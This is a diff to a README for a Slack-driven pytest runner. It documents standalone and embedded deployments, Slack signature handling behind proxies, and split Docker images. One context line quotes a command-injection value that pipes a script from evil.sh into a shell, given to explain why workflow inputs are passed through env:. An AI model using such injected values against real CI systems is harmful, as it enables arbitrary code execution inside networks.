@@ -170,6 +170,12 @@ slack-runtests/
 │       ├── reporter.py              # the four Slack milestones
 │       └── config.py
 ├── docker/                          # 1 edge + 3 identical test servers
+│   ├── Dockerfile                   #   TWO targets: edge (no pytest) and runner
+│   └── smoke.sh                     #   what each image IS, not that it built
+├── examples/                        # the two deployments, run for real in CI
+│   ├── standalone/                  #   A — own host, own port, SQLite
+│   ├── embedded/                    #   B — sidecar, no port, Postgres
+│   └── verify.sh                    #   brings both up and checks them
 ├── .github/workflows/runtests.yml   # the action V2 dispatches
 └── tests/
     ├── unit/                        # this project's gate
@@ -260,6 +266,97 @@ so `run: pytest -k ${{ inputs.select }}` with a value of
 `smoke"; curl evil.sh | sh; "` is arbitrary code execution on a machine inside
 your network. Routing through `env:` makes the value data the shell already
 holds. The regex in `parsing.py` is the second lock on the same door; keep both.
+
+## Deploying — two strategies, both supported
+
+Both work, both are exercised in CI, and each is written so a stranger with no
+connection to this project can follow it. Pick by one question: **does the
+process that will run this have a durable disk and a hostname of its own?**
+
+| | **A — standalone** | **B — embedded** |
+|---|---|---|
+| Runs | its own host, or its own container service | a sidecar inside an app you already run |
+| Public endpoint | its own, behind your TLS | the host app's, proxied |
+| Store | **SQLite** on a volume | **Postgres** — the host's |
+| Test servers reach it at | its hostname | the same public hostname, through the app |
+| Example | [`examples/standalone/`](examples/standalone/) | [`examples/embedded/`](examples/embedded/) |
+
+```bash
+cd examples/standalone      # or examples/embedded
+cp .env.example .env        # then EDIT it — neither will start until you do
+docker compose up -d
+```
+
+**Neither example carries a working default, and that is the design.** The
+server refuses to start unless a signing secret, a workspace id and at least one
+allowlist are set, so an example copied and not edited produces a refusal naming
+exactly what is missing — not a bot quietly accepting commands from anyone. CI
+asserts that refusal on an unedited copy before it checks anything else.
+
+### A — standalone
+
+The smaller deployment and the one to start with. One container, a volume, and
+a reverse proxy in front for TLS — which is not optional hardening, because
+Slack will not accept a slash-command URL that is not HTTPS.
+
+The compose file publishes on `127.0.0.1:8500`, not `8500`. On a cloud VM the
+second form binds the public interface, which is an unencrypted public endpoint
+one character away from a correct configuration; CI asserts the binding.
+
+### B — embedded
+
+The edge as a sidecar with **no published port at all**, reached only through
+the app already in front of it. That app is already terminating TLS and already
+has a hostname Slack will accept, so the sidecar needs neither.
+
+**Use Postgres here.** A container service with no persistent volume deletes a
+SQLite file on every redeploy, taking the queue, the in-flight leases and the
+whole run history with it. `EDGE_DB_DSN` is the only way to select it.
+
+> #### The defect this deployment produces if the proxy is written naturally
+>
+> **Slack's signature is computed over the raw request body bytes.** A handler
+> that parses the form and re-serialises it changes those bytes, and the edge
+> then rejects **every** real command as unsigned. Two things make it
+> expensive: it *passes your tests*, because a test that signs whatever it is
+> given signs the re-serialised body too; and it *looks like an outage*, because
+> Slack shows a generic failure and the bot appears to be down.
+>
+> Forward the raw bytes verbatim — in Next.js that is `await request.text()`,
+> never `request.formData()` — with both `X-Slack-Signature` and
+> `X-Slack-Request-Timestamp`. `examples/embedded/nginx.conf` does it correctly
+> and says why; `examples/verify.sh` signs a fixed body with a known secret,
+> sends it through that proxy, and fails if the far side refuses it. Planting a
+> body-altering proxy turns that check red with `{"error":"bad signature"}`.
+
+### The images
+
+Two, from one Dockerfile, and the split is not about size:
+
+```bash
+docker build --target edge   -t testrunner-edge   -f docker/Dockerfile .
+docker build --target runner -t testrunner-runner -f docker/Dockerfile .
+```
+
+| | `edge_server` | `test_server` | `pytest` | `psycopg` |
+|---|---|---|---|---|
+| **edge** | ✓ | ✗ | **✗** | ✓ |
+| **runner** | ✗ | ✓ | ✓ | ✓ |
+
+**The edge cannot run a suite, and that is the point.** It is the process that
+answers the internet and it never executes a test; shipping one image meant it
+carried pytest and the sample suite anyway. `docker/smoke.sh` asserts the
+inventory of both images — including that pytest is still absent from the
+**running** edge, which is the only check that would notice a `CMD` of `uv run`
+reinstalling the dev group at container start.
+
+(`psycopg` is in both, which is not an oversight: the store conformance suite
+needs it, so it lives in the dev group the runner image installs.)
+
+```bash
+bash docker/smoke.sh        # 15 checks over both images
+bash examples/verify.sh     # 12 checks, both examples up for real
+```
 
 ## The store — a file by default, Postgres by DSN
 
@@ -356,6 +453,8 @@ Stated plainly rather than left to be discovered:
 bash run.sh test -q                # unit + store conformance (SQLite)
 bash run.sh test:conformance -q    # the store suite alone, every backend
 bash run.sh test:integration -q    # against REAL processes
+bash docker/smoke.sh               # what each image IS
+bash examples/verify.sh            # both deployments, up for real
 ```
 
 Counts are not quoted here on purpose: a number in a README is a number nothing
